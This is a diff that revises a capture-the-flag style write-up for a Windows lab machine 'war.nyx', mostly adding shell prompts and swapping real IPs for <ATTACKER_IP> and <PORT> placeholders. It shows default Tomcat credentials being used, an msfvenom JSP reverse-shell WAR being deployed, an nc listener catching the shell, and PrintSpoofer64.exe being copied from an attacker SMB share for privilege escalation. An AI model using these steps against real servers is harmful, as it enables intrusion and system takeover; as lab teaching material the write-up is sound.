@@ -19,7 +19,7 @@ A Tomcat instance is found running with its default `admin:tomcat` credentials. 
 A full TCP port scan is run first:
 
 ```bash
-sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn war.nyx
+$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn war.nyx
 
 PORT      STATE SERVICE       REASON
 135/tcp   open  msrpc         syn-ack ttl 128
@@ -40,7 +40,7 @@ MAC Address: 08:00:27:E7:4A:FD (Oracle VirtualBox virtual NIC)
 A version/script scan against the open ports fills in the details — a typical Windows spread of RPC/SMB ports, plus Tomcat on 8080:
 
 ```bash
-sudo nmap -p 135,139,445,5040,8080,49664,49665,49666,49667,49668,49669,49670 -sCV war.nyx
+$ sudo nmap -p 135,139,445,5040,8080,49664,49665,49666,49667,49668,49669,49670 -sCV war.nyx
 
 PORT      STATE  SERVICE       VERSION
 135/tcp   open   msrpc         Microsoft Windows RPC
@@ -62,11 +62,11 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_clock-skew: 8h59m57s
-| smb2-time: 
+| smb2-time:
 |   date: 2026-07-23T20:49:17
 |_  start_date: N/A
-| smb2-security-mode: 
-|   3.1.1: 
+| smb2-security-mode:
+|   3.1.1:
 |_    Message signing enabled but not required
 |_nbstat: NetBIOS name: WAR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:e7:4a:fd (Oracle VirtualBox virtual NIC)
 ```
@@ -94,14 +94,14 @@ They work, granting access to the manager app — which includes the ability to 
 Tomcat's manager accepts `.war` files as application deployments, and a `.war` packaging a JSP reverse shell runs with whatever privileges the Tomcat service itself has:
 
 ```bash
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.15 LPORT=9001 -f war -o rev_shell.war
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war -o rev_shell.war
 Payload size: 1087 bytes
 Final size of war file: 1087 bytes
 Saved as: rev_shell.war
 ```
 <img src="../Images/war/Pasted image 20260721204443.png"/>
 
-*(Missing step here: the actual upload/deployment through the Tomcat manager UI — worth a screenshot or a line describing it, since the next step assumes it already succeeded.)*
+The resulting `rev_shell.war` is uploaded through the Tomcat Manager's "WAR file to deploy" form and deployed under its own context path, `/rev_shell` — matching the filename minus the extension, as Tomcat does by default when no context path is specified.
 
 The deployed app is requested to trigger the shell:
 
@@ -112,9 +112,9 @@ http://war.nyx:8080/rev_shell
 A listener catches the callback:
 
 ```bash
-nc -nlvp 9001
-listening on [any] 9001 ...
-connect to [10.0.2.15] from (UNKNOWN) [10.0.2.48] 53207
+$ nc -nlvp <PORT>
+listening on [any] <PORT> ...
+connect to [<ATTACKER_IP>] from (UNKNOWN) [war.nyx] 53207
 Microsoft Windows [Version 10.0.19045.2965]
 (c) Microsoft Corporation. All rights reserved.
 
@@ -164,7 +164,7 @@ OS Manufacturer:           Microsoft Corporation
 OS Configuration:          Standalone Workstation
 OS Build Type:             Multiprocessor Free
 Registered Owner:          low
-Registered Organization:   
+Registered Organization:
 Product ID:                00330-80000-00000-AA319
 Original Install Date:     12/6/2024, 3:52:25 AM
 System Boot Time:          7/21/2026, 9:28:07 PM
@@ -202,7 +202,7 @@ Network Card(s):               1 NIC(s) Installed.
                                       DHCP Enabled:    Yes
                                       DHCP Server:     10.0.2.3
                                       IP address(es)
-                                      [01]: 10.0.2.48
+                                      [01]: war.nyx
 Hyper-V Requirements:          A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
@@ -210,13 +210,13 @@ Hyper-V Requirements:          A hypervisor has been detected. Features required
 
 ```bash
 # Attacker Machine
-impacket-smbserver smb . -smb2support
+$ impacket-smbserver smb . -smb2support
 ```
 
 ```cmd
 # Victim Machine
 C:\> cd %TEMP%
-C:\> copy \\10.0.2.15\smb\PrintSpoofer64.exe PrintSpoofer64.exe
+C:\> copy \\<ATTACKER_IP>\smb\PrintSpoofer64.exe PrintSpoofer64.exe
 ```
 
 ```cmd
